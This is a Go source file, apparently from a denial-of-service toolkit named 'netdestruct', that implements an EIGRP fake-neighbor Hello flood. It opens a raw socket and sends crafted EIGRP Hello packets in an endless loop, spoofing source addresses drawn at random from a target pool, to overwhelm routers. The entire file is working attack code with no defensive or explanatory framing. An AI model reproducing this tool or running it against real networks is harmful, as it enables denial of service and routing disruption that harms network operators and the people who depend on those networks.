package eigrp

import (
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"

	"netdestruct/libs/dos/routing"
)

// FakeNeighbors floods EIGRP Hello packets with random source IPs from --target.
type FakeNeighbors struct {
	Interface string
	AS        uint32
	Target    string
}

func (f *FakeNeighbors) Run() error {
	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}
	pool, err := routing.ExpandTargets(f.Target)
	if err != nil {
		return err
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	srcMAC := iface.HardwareAddr
	if len(srcMAC) != 6 {
		return fmt.Errorf("interface %s has no MAC address", f.Interface)
	}

	var total int64
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total Hello packets sent: %d\n", eigrpTag, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	fmt.Printf("%s Beginning fake neighbor Hello flood on %s (AS %d, pool %d entries)\n",
		eigrpTag, f.Interface, f.AS, len(pool))
	fmt.Printf("%s Press Ctrl+C to stop.\n", eigrpTag)

	payload := buildHelloPacket(f.AS)
	for {
		srcIP := randomSourceFromPool(pool)
		var frame []byte
		if v4 := srcIP.To4(); v4 != nil {
			frame = buildIPv4Frame(srcMAC, v4, payload, 1)
		} else {
			frame = buildIPv6HelloFrame(srcMAC, srcIP.To16(), payload)
		}
		if err := sock.Send(frame); err != nil {
			return fmt.Errorf("send: %w", err)
		}
		atomic.AddInt64(&total, 1)
	}
}

func buildHelloPacket(asn uint32) []byte {
	pkt := make([]byte, 20)
	pkt[0] = 2
	pkt[1] = 5 // Hello
	binary.BigEndian.PutUint32(pkt[16:20], asn)
	binary.BigEndian.PutUint16(pkt[2:4], onesComplementChecksum(pkt))
	return pkt
}

func buildIPv6HelloFrame(srcMAC net.HardwareAddr, srcIP net.IP, payload []byte) []byte {
	frame := buildIPv6Frame(srcMAC, srcIP, payload)
	frame[21] = 1 // hop limit (TTL=1)
	return frame
}

func randomSourceFromPool(pool []routing.Route) net.IP {
	r := pool[randInt(len(pool))]
	if v4 := r.Addr.To4(); v4 != nil {
		if r.PrefixLen >= 32 {
			return v4
		}
		if r.PrefixLen > 0 {
			return randomHostInRoute(r)
		}
		return v4
	}
	return randomHostInRouteV6(r)
}

func randomHostInRouteV6(r routing.Route) net.IP {
	v6 := r.Addr.To16()
	if v6 == nil {
		return randIPv6()
	}
	ip := append(net.IP{}, v6...)
	if r.PrefixLen >= 128 {
		return ip
	}
	byteStart := r.PrefixLen / 8
	if r.PrefixLen%8 != 0 {
		byteStart++
	}
	for i := 15; i >= int(byteStart); i-- {
		ip[i] = byte(randInt(256))
	}
	return ip
}

func randIPv6() net.IP {
	var b [16]byte
	_, _ = rand.Read(b[:])
	return net.IP(b[:])
}
